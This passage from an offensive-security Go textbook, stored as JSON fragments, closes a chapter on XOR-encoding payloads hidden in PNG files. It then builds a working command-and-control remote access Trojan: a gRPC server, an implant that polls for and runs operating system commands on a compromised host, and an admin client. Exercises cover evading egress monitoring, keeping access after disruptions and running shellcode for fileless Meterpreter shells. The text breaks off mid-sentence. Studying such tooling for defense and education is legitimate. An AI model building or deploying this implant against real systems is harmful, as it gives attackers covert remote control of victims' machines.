Payload Original: 56 5D 43 5C 57 46 40 52 5D 45 5D 57 40 46 52 5D 45 5A 57\n46 46 55 5C 45 5D 50 40 46\n❷ Payload Decode: 31 32 33 34 32 34 33 35 32 35 35 32 32 35 35 32 35 32 32 34\n35 32 33 35 35 35 32 35\nSuccess: decodePNGfile created\nListing 13-21: Running the imgInject program to XOR decode a data chunk block\nThe Payload Original value ❶ is the encoded payload data read\nfrom the original PNG file, while the Payload Decode value ❷ is\nthe decrypted payload. If you compare your sample command\nline run from before and the output here, you’ll notice that\nyour decoded payload matches the original, cleartext value\nyou supplied originally.\nThere is a problem with the code, though. Recall that the\nprogram code injects your new decoded chunk at an offset\nposition of your specification. If you have a file that already\ncontains the encoded chunk segment and then attempt to write\na new file with a decoded chunk segment, you’ll end up with\nboth chunks in the new output file. You can see this in Figure\n13-5.\nFigure 13-5: The output file contains both the decoded chunk segment and encoded\nchunk segment.\nTo understand why this happens, recall that the encoded\nPNG file has the encoded chunk segment at offset 0x85258, as\nshown in Figure 13-6.\nFigure 13-6: The output file containing the encoded chunk segment\nThe problem presents itself when the decoded data is\nwritten to offset 0x85258. When the decoded data gets written to\nthe same location as the encoded data, our implementation\ndoesn’t delete the encoded data; it merely shifts the remainder\nof the file bytes to the right, including the encoded chunk\nsegment, as illustrated previously in Figure 13-5. This can\ncomplicate payload extraction or produce unintended\nconsequences, such as revealing the cleartext payload to\nnetwork devices or security software.\nFortunately, this issue is quite easy to resolve. Let’s take a\nlook at our previous WriteData() function. This time, you can\nmodify it to address the problem (Listing 13-22).\nHivaNetwork.Com\n//WriteData writes new data to offset\nfunc WriteData(r *bytes.Reader, c *models.CmdLineOpts, b []byte) {\noffset, err := strconv.ParseInt(c.Offset, 10, 64)\nif err != nil {\nlog.Fatal(err)\n}\nw, err := os.OpenFile(c.Output, os.O_RDWR|os.O_CREATE, 0777)\nif err != nil {\nlog.Fatal(\"Fatal: Problem writing to the output file!\")\n}\nr.Seek(0, 0)\nvar buff = make([]byte, offset)\nr.Read(buff)\nw.Write(buff)\nw.Write(b)\n❶ if c.Decode {\n❷ r.Seek(int64(len(b)), 1)\n}\n❸ _, err = io.Copy(w, r)\nif err == nil {\nfmt.Printf(\"Success: %s created\\n\", c.Output)\n}\n}\nListing 13-22: Updating WriteData() to prevent duplicate ancillary chunk types (/ch-\n13/imgInject/utils/writer.go)\nYou introduce the fix with the c.Decode conditional logic ❶.\nThe XOR operation produces a byte-for-byte transaction.\nTherefore, the encoded and decoded chunk segments are\nidentical in length. Furthermore, the bytes.Reader will contain the\nremainder of the original encoded image file at the moment\nthe decoded chunk segment is written. So, you can perform a\nright byte shift comprising the length of the decoded chunk\nsegment on the bytes.Reader ❷, advancing the bytes.Reader past the"
  },
  {
    "input": "Additional Exercises",
    "output": "encoded chunk segment and writing the remainder of bytes to\nyour new image file ❸.\nVoila! As you can see in Figure 13-7, the hex editor\nconfirms that you resolved the problem. No more duplicate\nancillary chunk types.\nFigure 13-7: The output file without duplicate ancillary data\nThe encoded data no longer exists. Additionally, running ls\n-la against the files should produce identical file lengths, even\nthough file bytes have changed.\nSUMMARY\nIn this chapter, you learned how to describe the PNG image\nfile format as a series of repetitive byte chunk segments, each\nwith its respective purpose and applicability. Next, you\nlearned methods of reading and navigating the binary file.\nThen you created byte data and wrote it to an image file.\nFinally, you used XOR encoding to obfuscate your payload.\nThis chapter focused on image files and only scratched the\nsurface of what you can accomplish by using steganography\ntechniques. But you should be able to apply what you learned\nhere to explore other binary file types.\nADDITIONAL EXERCISES\nLike many of the other chapters in this book, this chapter will\nprovide the most value if you actually code and experiment\nalong the way. Therefore, we want to conclude with a few\nchallenges to expand on the ideas already covered:\n1. While reading the XOR section, you may have noticed that the XorDecode()\nfunction produces a decoded chunk segment, but never updates the CRC\nchecksum. See if you can correct this issue.\n2. The WriteData() function facilitates the ability to inject arbitrary chunk\nsegments. What code changes would you have to make if you wanted to\noverwrite existing ancillary chunk segments? If you need help, our explanation\nabout byte shifting and the Seek() function may be useful in solving this\nproblem.\n3. Here’s a more challenging problem: try to inject a payload—the PNG DATA\nbyte chunk—by distributing it throughout various ancillary chunk segments.\nYou could do this one byte at a time, or with multiple groupings of bytes, so get\ncreative. As an added bonus, create a decoder that reads exact payload byte\noffset locations, making it easier to extract the payload.\n4. The chapter explained how to use XOR as a confidentiality technique—a\nmethod to obfuscate the implanted payload. Try to implement a different\ntechnique, such as AES encryption. Go core packages provide a number of\npossibilities (see Chapter 11 if you need a refresher). Observe how the solution\naffects the new image. Does it cause the overall size to increase, and if so, by\nhow much?\n5. Use the code ideas within this chapter to expand support for other image file\nformats. Other image specifications may not be as organized as PNG. Want\nproof? Give the PDF specification a read, as it can be rather intimidating. How\nwould you solve the challenges of reading and writing data to this new image\nformat?"
  },
  {
    "input": "14 BUILDING A COMMAND-AND-CONTROL RAT",
    "output": "14\nBUILDING A COMMAND-AND-\nCONTROL RAT\nIn this chapter, we’ll tie together several lessons from the\nprevious chapters to build a basic command and control (C2)\nremote access Trojan (RAT). A RAT is a tool used by\nattackers to remotely perform actions on a compromised\nvictim’s machine, such as accessing the filesystem, executing\ncode, and sniffing network traffic.\nBuilding this RAT requires building three separate tools: a\nclient implant, a server, and an admin component. The client\nimplant is the portion of the RAT that runs on a compromised\nworkstation. The server is what will interact with the client\nimplant, much like the way Cobalt Strike’s team server—the\nserver component of the widely used C2 tool—sends\ncommands to compromised systems. Unlike the team server,\nwhich uses a single service to facilitate server and\nadministrative functions, we’ll create a separate, stand-alone\nadmin component used to actually issue the commands. This\nserver will act as the middleman, choreographing"
  },
  {
    "input": "Getting Started",
    "output": "communications between compromised systems and the\nattacker interacting with the admin component.\nThere are an infinite number of ways to design a RAT. In\nthis chapter, we aim to highlight how to handle client and\nserver communications for remote access. For this reason,\nwe’ll show you how to build something simple and\nunpolished, and then prompt you to create significant\nimprovements that should make your specific version more\nrobust. These improvements, in many cases, will require you\nto reuse content and code examples from previous chapters.\nYou’ll apply your knowledge, creativity, and problem-solving\nability to enhance your implementation.\nGETTING STARTED\nTo get started, let’s review what we’re going to do: we’ll\ncreate a server that receives work in the form of operating\nsystem commands from an admin component (which we’ll\nalso create). We’ll create an implant that polls the server\nperiodically to look for new commands and then publishes the\ncommand output back onto the server. The server will then\nhand that result back to the administrative client so that the\noperator (you) can see the output.\nLet’s start by installing a tool that will help us handle all\nthese network interactions and reviewing the directory\nstructure for this project.\nInstalling Protocol Buffers for Defining a gRPC API\nWe’ll build all the network interactions by using gRPC, a\nhigh-performance remote procedure call (RPC) framework\ncreated by Google. RPC frameworks allow clients to\ncommunicate with servers over standard and defined protocols\nwithout having to understand any of the underlying details.\nThe gRPC framework operates over HTTP/2, communicating\nmessages in a highly efficient, binary structure.\nMuch like other RPC mechanisms, such as REST or\nSOAP, our data structures need to be defined in order to make\nthem easy to serialize and deserialize. Luckily for us, there’s a\nmechanism for defining our data and API functions so we can\nuse them with gRPC. This mechanism, Protocol Buffers (or\nProtobuf, for short), includes a standard syntax for API and\ncomplex data definitions in the form of a .proto file. Tooling\nexists to compile that definition file into Go-friendly interface\nstubs and data types. In fact, this tooling can produce output in\na variety of languages, meaning you can use the .proto file to\ngenerate C# stubs and types.\nYour first order of business is to install the Protobuf\ncompiler on your system. Walking through the installation is\noutside the scope of this book, but you’ll find full details under\nthe “Installation” section of the official Go Protobuf repository\nat https://github.com/golang/protobuf/. Also, while you’re at\nit, install the gRPC package with the following command:\n> go get -u google.golang.org/grpc\nCreating the Project Workspace\nNext, let’s create our project workspace. We’ll create four\nsubdirectories to account for the three components (the\nimplant, server, and admin component) and the gRPC API\ndefinition files. In each of the component directories, we’ll\ncreate a single Go file (of the same name as the encompassing"
  },
  {
    "input": "Defining and Building the gRPC API",
    "output": "directory) that’ll belong to its own main package. This lets us\nindependently compile and run each as a stand-alone\ncomponent and will create a descriptive binary name in the\nevent we run go build on the component. We’ll also create a file\nnamed implant.proto in our grpcapi directory. That file will\nhold our Protobuf schema and gRPC API definitions. Here’s\nthe directory structure you should have:\n$ tree\n.\n|-- client\n| |-- client.go\n|-- grpcapi\n| |-- implant.proto\n|-- implant\n| |-- implant.go\n|-- server\n|-- server.go\nWith the structure created, we can begin building our\nimplementation. Throughout the next several sections, we’ll\nwalk you through the contents of each file.\nDEFINING AND BUILDING THE\nGRPC API\nThe next order of business is to define the functionality and\ndata our gRPC API will use. Unlike building and consuming\nREST endpoints, which have a fairly well-defined set of\nexpectations (for example, they use HTTP verbs and URL\npaths to define which action to take on which data), gRPC is\nmore arbitrary. You effectively define an API service and tie\nto it the function prototypes and data types for that service.\nWe’ll use Protobufs to define our API. You can find a full\nexplanation of the Protobuf syntax with a quick Google\nsearch, but we’ll briefly explain it here.\nAt a minimum, we’ll need to define an administrative\nservice used by operators to send operating system commands\n(work) to the server. We’ll also need an implant service used\nby our implant to fetch work from the server and send the\ncommand output back to the server. Listing 14-1 shows the\ncontents of the implant.proto file. (All the code listings at the\nroot location of / exist under the provided github repo\nhttps://github.com/blackhat-go/bhg/.)\n//implant.proto\nsyntax = \"proto3\";\n❶ package grpcapi;\n// Implant defines our C2 API functions\n❷ service Implant {\nrpc FetchCommand (Empty) returns (Command);\nrpc SendOutput (Command) returns (Empty);\n}\n// Admin defines our Admin API functions\n❸ service Admin {\nrpc RunCommand (Command) returns (Command);\n}\n// Command defines a with both input and output fields\n❹ message Command {\nstring In = 1;\nstring Out = 2;\n}\n// Empty defines an empty message used in place of null\n❺ message Empty {\n}\nListing 14-1: Defining the gRPC API by using Protobuf (/ch-\n14/grpcapi/implant.proto)\nRecall how we intend to compile this definition file into\nGo-specific artifacts? Well, we explicitly include package grpcapi\n❶ to instruct the compiler that we want these artifacts created\nunder the grpcapi package. The name of this package is\narbitrary. We picked it to ensure that the API code remains\nseparate from the other components.\nOur schema then defines a service named Implant and a\nservice named Admin. We’re separating these because we\nexpect our Implant component to interact with our API in a\ndifferent manner than our Admin client. For example, we\nwouldn’t want our Implant sending operating system command\nwork to our server, just as we don’t want to require our Admin\ncomponent to send command output to the server.\nWe define two methods on the Implant service: FetchCommand\nand SendOutput ❷. Defining these methods is like defining an\ninterface in Go. We’re saying that any implementation of the\nImplant service will need to implement those two methods.\nFetchCommand, which takes an Empty message as a parameter and\nreturns a Command message, will retrieve any outstanding\noperating system commands from the server. SendOutput will\nsend a Command message (which contains command output)\nback to the server. These messages, which we’ll cover\nmomentarily, are arbitrary, complex data structures that\ncontain fields necessary for us to pass data back and forth\nbetween our endpoints.\nOur Admin service defines a single method: RunCommand,\nwhich takes a Command message as a parameter and expects to\nread a Command message back ❸. Its intention is to allow you,\nthe RAT operator, to run an operating system command on a\nremote system that has a running implant.\nLastly, we define the two messages we’ll be passing\naround: Command and Empty. The Command message contains two\nfields, one used for maintaining the operating system\ncommand itself (a string named In) and one used for\nmaintaining the command output (a string named Out) ❹. Note\nthat the message and field names are arbitrary, but that we\nassign each field a numerical value. You might be wondering\nhow we can assign In and Out numerical values if we defined\nthem to be strings. The answer is that this is a schema\ndefinition, not an implementation. Those numerical values\nrepresent the offset within the message itself where those\nfields will appear. We’re saying In will appear first, and Out\nwill appear second. The Empty message contains no fields ❺.\nThis is a hack to work around the fact that Protobuf doesn’t\nexplicitly allow null values to be passed into or returned from\nan RPC method.\nNow we have our schema. To wrap up the gRPC definition,\nwe need to compile the schema. Run the following command\nfrom the grpcapi directory:\n> protoc -I . implant.proto --go_out=plugins=grpc:./\nThis command, which is available after you complete the\ninitial installation we mentioned earlier, searches the current\ndirectory for the Protobuf file named implant.proto and\nproduces Go-specific output in the current directory. Once you\nexecute it successfully, you should have a new file named\nHivaNetwork.Com"
  },
  {
    "input": "Creating the Server",
    "output": "implant.pb.go in your grpcapi directory. This new file contains\nthe interface and struct definitions for the services and messages\ncreated in the Protobuf schema. We’ll leverage this for\nbuilding our server, implant, and admin component. Let’s\nbuild these one by one.\nCREATING THE SERVER\nLet’s start with the server, which will accept commands from\nthe admin client and polling from the implant. The server will\nbe the most complicated of the components, since it’ll need to\nimplement both the Implant and Admin services. Plus, since it’s\nacting as a middleman between the admin component and\nimplant, it’ll need to proxy and manage messages coming to\nand from each side.\nImplementing the Protocol Interface\nLet’s first look at the guts of our server in server/server.go\n(Listing 14-2). Here, we’re implementing the interface\nmethods necessary for the server to read and write commands\nfrom and to shared channels.\n❶ type implantServer struct {\nwork, output chan *grpcapi.Command\n}\ntype adminServer struct {\nwork, output chan *grpcapi.Command\n}\n❷ func NewImplantServer(work, output chan *grpcapi.Command) *implantServer\n{\ns := new(implantServer)\ns.work = work\ns.output = output\nreturn s\n}\nfunc NewAdminServer(work, output chan *grpcapi.Command) *adminServer {\ns := new(adminServer)\ns.work = work\ns.output = output\nreturn s\n}\n❸ func (s *implantServer) FetchCommand(ctx context.Context, \\\nempty *grpcapi.Empty) (*grpcapi.Command, error) {\nvar cmd = new(grpcapi.Command)\n❹ select {\ncase cmd, ok := <-s.work:\nif ok {\nreturn cmd, nil\n}\nreturn cmd, errors.New(\"channel closed\")\ndefault:\n// No work\nreturn cmd, nil\n}\n}\n❺ func (s *implantServer) SendOutput(ctx context.Context, \\\nresult *grpcapi.Command)\n(*grpcapi.Empty, error) {\ns.output <- result\nreturn &grpcapi.Empty{}, nil\n}\n❻ func (s *adminServer) RunCommand(ctx context.Context, cmd\n*grpcapi.Command) \\\n(*grpcapi.Command, error) {\nvar res *grpcapi.Command\ngo func() {\ns.work <- cmd\n}()\nres = <-s.output\nreturn res, nil\n}\nListing 14-2: Defining the server types (/ch-14/server/server.go)\nTo serve our admin and implant APIs, we need to define\nserver types that implement all the necessary interface\nmethods. This is the only way we can start an Implant or Admin\nservice. That is, we’ll need to have the FetchCommand(ctx\ncontext.Context, empty *grpcapi.Empty), SendOutput(ctx context .Context, result\n*grpcapi.Command), and RunCommand(ctx context.Context, cmd\n*grpcapi.Command) methods properly defined. To keep our\nimplant and admin APIs mutually exclusive, we’ll implement\nthem as separate types.\nFirst, we create our structs, named implantServer and adminServer,\nthat’ll implement the necessary methods ❶. Each type\ncontains identical fields: two channels, used for sending and\nreceiving work and command output. This is a pretty simple\nway for our servers to proxy the commands and their\nresponses between the admin and implant components.\nNext, we define a couple of helper functions,\nNewImplantServer(work, output chan *grpcapi.Command) and\nNewAdminServer(work, output chan *grpcapi.Command), that create new\nimplantServer and adminServer instances ❷. These exist solely to\nmake sure the channels are properly initialized.\nNow comes the interesting part: the implementation of our\ngRPC methods. You might notice that the methods don’t\nexactly match the Protobuf schema. For example, we’re\nreceiving a context.Context parameter in each method and\nreturning an error. The protoc command you ran earlier to\ncompile your schema added these to each interface method\ndefinition in the generated file. This lets us manage request\ncontext and return errors. This is pretty standard stuff for most\nnetwork communications. The compiler spared us from having\nto explicitly require that in our schema file.\nThe first method we implement on our implantServer,\nFetchCommand(ctx context.Context, empty *grpcapi.Empty), receives a\n*grpcapi.Empty and returns a *grpcapi.Command ❸. Recall that we\ndefined this Empty type because gRPC doesn’t allow null values\nexplicitly. We don’t need to receive any input since the client\nimplant will call the FetchCommand(ctx context.Context, empty *grpcapi\n.Empty) method as sort of a polling mechanism that asks, “Hey,\ndo you have work for me?” The method’s logic is a bit more\ncomplicated, since we can send work to the implant only if we\nactually have work to send. So, we use a select statement ❹ on\nthe work channel to determine whether we do have work.\nReading from a channel in this manner is nonblocking,\nmeaning that execution will run our default case if there’s\nnothing to read from the channel. This is ideal, since we’ll\nhave our implant calling FetchCommand(ctx context.Context, empty\n*grpcapi.Empty) on a periodic basis as a way to get work on a\nnear-real-time schedule. In the event that we do have work in\nthe channel, we return the command. Behind the scenes, the\ncommand will be serialized and sent over the network back to\nthe implant.\nThe second implantServer method, SendOutput(ctx context.Context,\nresult *grpcapi.Command), pushes the received *grpcapi.Command onto\nthe output channel ❺. Recall that we defined our Command to\nhave not only a string field for the command to run, but also a\nfield to hold the command’s output. Since the Command we’re\nreceiving has the output field populated with the result of a\ncommand (as run by the implant) the SendOutput(ctx context.Context,\nresult *grpcapi.Command) method simply takes that result from the\nimplant and puts it onto a channel that our admin component\nwill read from later.\nThe last implantServer method, RunCommand(ctx context.Context, cmd\n*grpcapi.Command), is defined on the adminServer type. It receives a\nCommand that has not yet been sent to the implant ❻. It\nrepresents a unit of work our admin component wants our\nimplant to execute. We use a goroutine to place our work on\nthe work channel. As we’re using an unbuffered channel, this\naction blocks execution. We need to be able to read from the\noutput channel, though, so we use a goroutine to put work on\nthe channel and continue execution. Execution blocks, waiting\nfor a response on our output channel. We’ve essentially made\nthis flow a synchronous set of steps: send a command to an\nimplant and wait for a response. When we receive the\nresponse, we return the result. Again, we expect this result, a\nCommand, to have its output field populated with the result of\nthe operating system command executed by the implant.\nWriting the main() Function\nListing 14-3 shows the server/server.go file’s main() function,\nwhich runs two separate servers—one to receive commands\nfrom the admin client and the other to receive polling from the\nimplant. We have two listeners so that we can restrict access to\nour admin API—we don’t want just anyone interacting with it\n—and we want to have our implant listen on a port that you\ncan access from restrictive networks.\nfunc main() {\n❶ var (\nimplantListener, adminListener net.Listener\nerr error\nopts []grpc.ServerOption\nwork, output chan *grpcapi.Command\n)\n❷ work, output = make(chan *grpcapi.Command), make(chan\n*grpcapi.Command)\n❸ implant := NewImplantServer(work, output)\nadmin := NewAdminServer(work, output)\n❹ if implantListener, err = net.Listen(\"tcp\", \\\nfmt.Sprintf(\"localhost:%d\", 4444)); err != nil {\nlog.Fatal(err)\n}\nif adminListener, err = net.Listen(\"tcp\", \\\nfmt.Sprintf(\"localhost:%d\", 9090)); err != nil {\nlog.Fatal(err)\n}\n❺ grpcAdminServer, grpcImplantServer := \\\ngrpc.NewServer(opts...), grpc.NewServer(opts...)\n❻ grpcapi.RegisterImplantServer(grpcImplantServer, implant)\ngrpcapi.RegisterAdminServer(grpcAdminServer, admin)\n❼ go func() {\ngrpcImplantServer.Serve(implantListener)\n}()\n❽ grpcAdminServer.Serve(adminListener)\n}\nListing 14-3: Running admin and implant servers (/ch-14/server/server.go)\nFirst, we declare variables ❶. We use two listeners: one for\nthe implant server and one for the admin server. We’re doing\nthis so that we can serve our admin API on a port separate\nfrom our implant API.\nWe create the channels we’ll use for passing messages\nbetween the implant and admin services ❷. Notice that we use\nthe same channels for initializing both the implant and admin\nservers via calls to NewImplantServer(work, output) and\nNewAdminServer(work, output) ❸. By using the same channel\ninstances, we’re letting our admin and implant servers talk to\neach other over this shared channel.\nNext, we initiate our network listeners for each server,\nbinding our implantListener to port 4444 and our adminListener to\nport 9090 ❹. We’d generally use port 80 or 443, which are\nHTTP/s ports that are commonly allowed to egress networks,\nbut in this example, we just picked an arbitrary port for testing\npurposes and to avoid interfering with other services running\non our development machines.\nWe have our network-level listeners defined. Now we set\nup our gRPC server and API. We create two gRPC server\ninstances (one for our admin API and one for our implant API)\nby calling grpc.NewServer() ❺. This initializes the core gRPC\nserver that will handle all the network communications and\nsuch for us. We just need to tell it to use our API. We do this\nby registering instances of API implementations (named implant\nand admin in our example) by calling\ngrpcapi.RegisterImplantServer(grpcImplantServer, implant) ❻ and\ngrpcapi.RegisterAdminServer(grpcAdminServer, admin). Notice that,\nalthough we have a package we created named grpcapi, we\nnever defined these two functions; the protoc command did. It\ncreated these functions for us in implant.pb.go as a means to\ncreate new instances of our implant and admin gRPC API\nservers. Pretty slick!\nAt this point, we’ve defined the implementations of our\nAPI and registered them as gRPC services. The last thing we\ndo is start our implant server by calling"
  },
  {
    "input": "Creating the Client Implant",
    "output": "grpcImplantServer.Serve(implantListener) ❼. We do this from within a\ngoroutine to prevent the code from blocking. After all, we\nwant to also start our admin server, which we do via a call to\ngrpcAdminServer.Serve(adminListener)\n❽.\nYour server is now complete, and you can start it by\nrunning go run server/server.go. Of course, nothing is interacting\nwith your server, so nothing will happen yet. Let’s move on to\nthe next component—our implant.\nCREATING THE CLIENT IMPLANT\nThe client implant is designed to run on compromised\nsystems. It will act as a backdoor through which we can run\noperating system commands. In this example, the implant will\nperiodically poll the server, asking for work. If there is no\nwork to be done, nothing happens. Otherwise, the implant\nexecutes the operating system command and sends the output\nback to the server.\nListing 14-4 shows the contents of implant/implant.go.\nfunc main() {\nvar\n(\nopts []grpc.DialOption\nconn *grpc.ClientConn\nerr error\nclient grpcapi.ImplantClient ❶\n)\nopts = append(opts, grpc.WithInsecure())\nif conn, err = grpc.Dial(fmt.Sprintf(\"localhost:%d\", 4444), opts...); err != nil {\n❷\nlog.Fatal(err)\n}\ndefer conn.Close()\nclient = grpcapi.NewImplantClient(conn) ❸\nctx := context.Background()\nfor { ❹\nvar req = new(grpcapi.Empty)\ncmd, err := client.FetchCommand(ctx, req) ❺\nif err != nil {\nlog.Fatal(err)\n}\nif cmd.In == \"\" {\n// No work\ntime.Sleep(3*time.Second)\ncontinue\n}\ntokens := strings.Split(cmd.In, \" \") ❻\nvar c *exec.Cmd\nif len(tokens) == 1 {\nc = exec.Command(tokens[0])\n} else {\nc = exec.Command(tokens[0], tokens[1:]...)\n}\nbuf, err := c.CombinedOutput()❼\nif err != nil {\ncmd.Out = err.Error()\n}\ncmd.Out += string(buf)\nclient.SendOutput(ctx, cmd) ❽\n}\n}\nListing 14-4: Creating the implant (/ch-14/implant/implant.go)\nThe implant code contains a main() function only. We start\nby declaring our variables, including one of the\ngrpcapi.ImplantClient type ❶. The protoc command automatically\ncreated this type for us. The type has all the required RPC\nfunction stubs necessary to facilitate remote communications.\nWe then establish a connection, via grpc.Dial(target string,\nopts... DialOption), to the implant server running on port 4444\n❷. We’ll use this connection for the call to\ngrpcapi.NewImplantClient(conn) ❸ (a function that protoc created for\nus). We now have our gRPC client, which should have an\nestablished connection back to our implant server.\nOur code proceeds to use an infinite for loop ❹ to poll the\nimplant server, repeatedly checking to see if there’s work that\nneeds to be performed. It does this by issuing a call to\nclient.FetchCommand(ctx, req), passing it a request context and Empty\nstruct ❺. Behind the scenes, it’s connecting to our API server.\nIf the response we receive doesn’t have anything in the cmd.In\nfield, we pause for 3 seconds and then try again. When a unit\nof work is received, the implant splits the command into\nindividual words and arguments by calling strings.Split(cmd.In, \" \")\n❻. This is necessary because Go’s syntax for executing\noperating system commands is exec.Command(name, args...),\nwhere name is the command to be run and args... is a list of\nany subcommands, flags, and arguments used by that\noperating system command. Go does this to prevent operating\nsystem command injection, but it complicates our execution,\nbecause we have to split up the command into relevant pieces\nbefore we can run it. We run the command and gather output\nby running c.CombinedOutput() ❼. Lastly, we take that output and\ninitiate a gRPC call to client.SendOutput(ctx, cmd) to send our\ncommand and its output back to the server ❽.\nYour implant is complete, and you can run it via go run\nimplant/implant.go. It should connect to your server. Again, it’ll be\nanticlimactic, as there’s no work to be performed. Just a\nHivaNetwork.Com"
  },
  {
    "input": "Building the Admin Component",
    "output": "couple of running processes, making a connection but doing\nnothing meaningful. Let’s fix that.\nBUILDING THE ADMIN\nCOMPONENT\nThe admin component is the final piece to our RAT. It’s where\nwe’ll actually produce work. The work will get sent, via our\nadmin gRPC API, to the server, which then forwards it on to\nthe implant. The server gets the output from the implant and\nsends it back to the admin client. Listing 14-5 shows the code\nin client/client.go.\nfunc main() {\nvar\n(\nopts []grpc.DialOption\nconn *grpc.ClientConn\nerr error\nclient grpcapi.AdminClient ❶\n)\nopts = append(opts, grpc.WithInsecure())\nif conn, err = grpc.Dial(fmt.Sprintf(\"localhost:%d\", 9090), opts...); err != nil {\n❷\nlog.Fatal(err)\n}\ndefer conn.Close()\nclient = grpcapi.NewAdminClient(conn) ❸\nvar cmd = new(grpcapi.Command)\ncmd.In = os.Args[1] ❹\nctx := context.Background()\ncmd, err = client.RunCommand(ctx, cmd) ❺\nif err != nil {\nlog.Fatal(err)\n}"
  },
  {
    "input": "Running the RAT",
    "output": "fmt.Println(cmd.Out) ❻\n}\nListing 14-5: Creating the admin client (/ch-14/client/client.go)\nWe start by defining our grpcapi.AdminClient variable ❶,\nestablishing a connection to our administrative server on port\n9090 ❷, and using the connection in a call to\ngrpcapi.NewAdminClient(conn) ❸, creating an instance of our admin\ngRPC client. (Remember that the grpcapi.AdminClient type and\ngrpcapi.NewAdminClient() function were created for us by protoc.)\nBefore we proceed, compare this client creation process with\nthat of the implant code. Notice the similarities, but also the\nsubtle differences in types, function calls, and ports.\nAssuming there is a command line argument, we read the\noperating system command from it ❹. Of course, the code\nwould be more robust if we checked whether an argument was\npassed in, but we’re not worried about it for this example. We\nassign that command string to the cmd.In. We pass this cmd, a\n*grpcapi.Command instance, to our gRPC client’s RunCommand(ctx\ncontext.Context, cmd *grpcapi.Command) method ❺. Behind the\nscenes, this command gets serialized and sent to the admin\nserver we created earlier. After the response is received, we\nexpect the output to populate with the operating system\ncommand results. We write that output to the console ❻.\nRUNNING THE RAT\nNow, assuming you have both the server and the implant\nrunning, you can execute your admin client via go run\nclient/client.go command. You should receive the output in your"
  },
  {
    "input": "Improving the RAT",
    "output": "admin client terminal and have it displayed to the screen, like\nthis:\n$ go run client/client.go 'cat /etc/resolv.conf'\ndomain Home\nnameserver 192.168.0.1\nnameserver 205.171.3.25\nThere it is—a working RAT. The output shows the\ncontents of a remote file. Run some other commands to see\nyour implant in action.\nIMPROVING THE RAT\nAs we mentioned at the beginning of this chapter, we\npurposely kept this RAT small and feature-bare. It won’t scale\nwell. It doesn’t gracefully handle errors or connection\ndisruptions, and it lacks a lot of basic features that allow you\nto evade detection, move across networks, escalate privileges,\nand more.\nRather than making all these improvements in our example,\nwe instead lay out a series of enhancements that you can make\non your own. We’ll discuss some of the considerations but will\nleave each as an exercise for you. To complete these exercises,\nyou’ll likely need to refer to other chapters of this book, dig\ndeeper into Go package documentation, and experiment with\nusing channels and concurrency. It’s an opportunity to put\nyour knowledge and skills to a practical test. Go forth and\nmake us proud, young Padawan.\nEncrypt Your Communications\nAll C2 utilities should encrypt their network traffic! This is\nespecially important for communications between the implant\nand the server, as you should expect to find egress network\nmonitoring in any modern enterprise environment.\nModify your implant to use TLS for these communications.\nThis will require you to set additional values for the\n[]grpc.DialOptions slice on the client as well as on the server.\nWhile you’re at it, you should probably alter your code so that\nservices are bound to a defined interface, and listen and\nconnect to localhost by default. This will prevent unauthorized\naccess.\nA consideration you’ll have to make, particularly if you’ll\nbe performing mutual certificate-based authentication, is how\nto administer and manage the certificates and keys in the\nimplant. Should you hardcode them? Store them remotely?\nDerive them at runtime with some magic voodoo that\ndetermines whether your implant is authorized to connect to\nyour server?\nHandle Connection Disruptions\nWhile we’re on the topic of communications, what happens if\nyour implant can’t connect to your server or if your server dies\nwith a running implant? You may have noticed that it breaks\neverything—the implant dies. If the implant dies, well, you’ve\nlost access to that system. This can be a pretty big deal,\nparticularly if the initial compromise happened in a manner\nthat’s hard to reproduce.\nFix this problem. Add some resilience to your implant so\nthat it doesn’t immediately die if a connection is lost. This will\nlikely involve replacing calls to log.Fatal(err) in your implant.go\nfile with logic that calls grpc.Dial(target string, opts\n...DialOption) again.\nRegister the Implants\nYou’ll want to be able to track your implants. At present, our\nadmin client sends a command expecting only a single implant\nto exist. There is no means of tracking or registering an\nimplant, let alone any means of sending a command to a\nspecific implant.\nAdd functionality that makes an implant register itself with\nthe server upon initial connection, and add functionality for\nthe admin client to retrieve a list of registered implants.\nPerhaps you assign a unique integer to each implant or use a\nUUID (check out https://github.com/google/uuid/). This will\nrequire changes to both the admin and implant APIs, starting\nwith your implant.proto file. Add a RegisterNewImplant RPC\nmethod to the Implant service, and add ListRegisteredImplants to the\nAdmin service. Recompile the schema with protoc, implement the\nappropriate interface methods in server/server.go, and add the\nnew functionality to the logic in client/client.go (for the admin\nside) and implant/implant.go (for the implant side).\nAdd Database Persistence\nIf you completed the previous exercises in this section, you\nadded some resilience to the implants to withstand connection\ndisruptions and set up registration functionality. At this point,\nyou’re most likely maintaining the list of registered implants\nin memory in server/server.go. What if you need to restart the\nserver or it dies? Your implants will continue to reconnect, but\nwhen they do, your server will be unaware of which implants\nare registered, because you’ll have lost the mapping of the\nimplants to their UUID.\nUpdate your server code to store this data in a database of\nyour choosing. For a fairly quick and easy solution with\nminimal dependencies, consider a SQLite database. Several\nGo drivers are available. We personally used go-sqlite3\n(https://github.com/mattn/go-sqlite3/).\nSupport Multiple Implants\nRealistically, you’ll want to support multiple simultaneous\nimplants polling your server for work. This would make your\nRAT significantly more useful, because it could manage more\nthan a single implant, but it requires pretty significant changes\nas well.\nThat’s because, when you wish to execute a command on\nan implant, you’ll likely want to execute it on a single specific\nimplant, not the first one that polls the server for work. You\ncould rely on the implant ID created during registration to\nkeep the implants mutually exclusive, and to direct commands\nand output appropriately. Implement this functionality so that\nyou can explicitly choose the destination implant on which the\ncommand should be run.\nFurther complicating this logic, you’ll need to consider that\nyou might have multiple admin operators sending commands\nout simultaneously, as is common when working with a team.\nThis means that you’ll probably want to convert your work and\noutput channels from unbuffered to buffered types. This will\nhelp keep execution from blocking when there are multiple\nmessages in-flight. However, to support this sort of\nmultiplexing, you’ll need to implement a mechanism that can\nmatch a requestor with its proper response. For example, if\ntwo admin operators send work simultaneously to implants,\nthe implants will generate two separate responses. If operator\n1 sends the ls command and operator 2 sends the ifconfig\ncommand, it wouldn’t be appropriate for operator 1 to receive\nthe command output for ifconfig, and vice versa.\nAdd Implant Functionality\nOur implementation expects the implants to receive and run\noperating system commands only. However, other C2 software\ncontains a lot of other convenience functions that would be\nnice to have. For example, it would be nice to be able to\nupload or download files to and from our implants. It might be\nnice to run raw shellcode, in the event we want to, for\nexample, spawn a Meterpreter shell without touching disk.\nExtend the current functionality to support these additional\nfeatures.\nChain Operating System Commands\nBecause of the way Go’s os/exec package creates and runs\ncommands, you can’t currently pipe the output of one\ncommand as input into a second command. For example, this\nwon’t work in our current implementation: ls -la | wc -l. To fix\nthis, you’ll need to play around with the command variable,\nwhich is created when you call 